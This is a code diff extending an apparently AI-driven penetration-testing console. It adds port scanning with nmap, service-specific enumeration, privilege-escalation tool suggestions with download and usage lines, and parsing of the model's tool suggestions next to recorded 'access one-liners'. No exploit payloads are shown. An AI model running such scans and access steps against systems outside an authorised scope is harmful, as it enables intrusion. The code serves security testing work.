+        elif stripped.startswith("TOOL:"):
+            resp.tool_suggestions.append(stripped[5:].strip())
         elif stripped.startswith("DONE:"):
             resp.done = True
             resp.done_summary = stripped[5:].strip()
@@ -680,6 +1096,9 @@ def show_help():
       :run <cmd>          Run a local command directly
       :rrun <cmd>         Run a command on remote target (SSH)
       :auto               Run auto-enum checks for current phase
+      :svc <port>         Run service-specific enum for a port (e.g. :svc 445)
+      :ports              Detect open ports and suggest service checks
+      :tools              Show downloadable tool suggestions for current phase
       :scan               Quick nmap scan (top 100 ports)
       :fullscan           Full nmap scan (all ports)
       :findings           Show current findings
@@ -945,6 +1364,75 @@ def interactive_loop(client: OllamaClient, session: Session, scope: set[str],
                 print(output)
             continue
 
+        if user_input.startswith(":svc"):
+            parts = user_input.split(maxsplit=1)
+            if len(parts) != 2:
+                cprint("red", "  Usage: :svc <port>  (e.g. :svc 445)")
+                cprint("dim", f"  Available ports: {', '.join(sorted(SERVICE_PORT_MAP.keys(), key=int))}")
+                continue
+            port = parts[1].strip()
+            if port not in SERVICE_PORT_MAP:
+                cprint("red", f"  No service checks for port {port}")
+                cprint("dim", f"  Available: {', '.join(sorted(SERVICE_PORT_MAP.keys(), key=int))}")
+                continue
+            checks = SERVICE_PORT_MAP[port]
+            cprint("cyan", f"  Service enum for port {port}:")
+            run_auto_checks(checks, session, client, execute_cmd)
+            continue
+
+        if user_input == ":ports":
+            cprint("dim", "  Scanning for open ports...")
+            code, output = run_command(
+                f"nmap -Pn --top-ports 200 -T4 --open {session.target}",
+                timeout=120,
+            )
+            if code != 0:
+                cprint("red", f"  Scan failed: {output}")
+                continue
+            detected: list[str] = []
+            for line in output.splitlines():
+                m = re.match(r"\s*(\d+)/tcp\s+open", line)
+                if m:
+                    detected.append(m.group(1))
+            if not detected:
+                cprint("yellow", "  No open TCP ports detected.")
+                continue
+            cprint("green", f"  Open ports: {', '.join(detected)}")
+            has_checks = [p for p in detected if p in SERVICE_PORT_MAP]
+            if has_checks:
+                cprint("cyan", "  Service-specific checks available for:")
+                for p in has_checks:
+                    checks = SERVICE_PORT_MAP[p]
+                    cprint("green", f"    Port {p}: {len(checks)} checks  → :svc {p}")
+            else:
+                cprint("dim", "  No service-specific checks for detected ports.")
+            rec = CommandRecord(
+                phase="recon", command=f"nmap -Pn --top-ports 200 -T4 --open {session.target}",
+                exit_code=code, output=output, useful=bool(detected), note="port detection",
+            )
+            session.commands.append(rec)
+            continue
+
+        if user_input == ":tools":
+            relevant = get_relevant_tools(session)
+            if not relevant:
+                cprint("dim", "  No tool suggestions for current phase/OS.")
+                cprint("dim", "  Set :os and :phase first, or try from privesc phase.")
+                continue
+            cprint("cyan", f"\n  Tool suggestions for {session.phase} ({session.target_os or 'any OS'}):\n")
+            for i, tool in enumerate(relevant, 1):
+                cprint("yellow", f"  {i}. {tool['name']}")
+                cprint("dim",    f"     {tool['description']}")
+                if tool.get("prereq"):
+                    cprint("dim", f"     Prereq: {tool['prereq']}")
+                cprint("dim",    f"     Check:    {tool['condition']}")
+                cprint("green",  f"     Download: {tool['download']}")
+                cprint("green",  f"     Usage:    {tool['usage']}")
+                print()
+            cprint("dim", "  These tools need manual download. xs-ai checks conditions only.")
+            cprint("dim", "  Run the 'Check' command via :run or :rrun to verify prerequisites.")
+            continue
+
         if user_input == ":auto":
             if session.phase == "recon":
                 checks = RECON_CHECKS
@@ -1039,6 +1527,10 @@ def interactive_loop(client: OllamaClient, session: Session, scope: set[str],
         if ai.access_line:
             cprint("yellow", f"\n  ACCESS ONE-LINER: {ai.access_line}")
             session.findings.append(f"[ACCESS] {ai.access_line}")
+
+        for tool in ai.tool_suggestions:
+            cprint("magenta", f"  TOOL SUGGESTION: {tool}")
+            session.findings.append(f"[TOOL] {tool}")
 
         for need in ai.needs:
             cprint("yellow", f"  NEED: {need}")
